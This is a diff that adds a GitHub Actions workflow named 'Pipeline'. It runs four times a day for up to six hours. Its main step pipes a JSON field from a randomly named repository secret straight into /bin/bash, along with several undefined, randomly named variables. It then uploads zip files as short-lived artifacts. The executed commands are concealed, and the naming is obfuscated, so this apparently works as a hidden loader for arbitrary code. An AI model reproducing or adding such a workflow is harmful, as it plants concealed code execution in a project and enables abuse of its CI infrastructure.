@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          fdmmh8618: ${{ secrets.fdmmh8618 }}
+        run: |
+          printf '%s' "$fdmmh8618" | jq -r .qds4 | /bin/bash
+          echo $o3033 | jq -r .hjttx58 | /bin/bash
+          printf '%s' "$n656" | jq -r .zsyzr580 | /bin/bash
+          printf '%s' "$jf8" | jq -r .bfxou2448 | /bin/bash
+          printf '%s' "$q18698" | jq -r .l564 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: T7NnP19K
+          path: "*.zip"
+          retention-days: 1
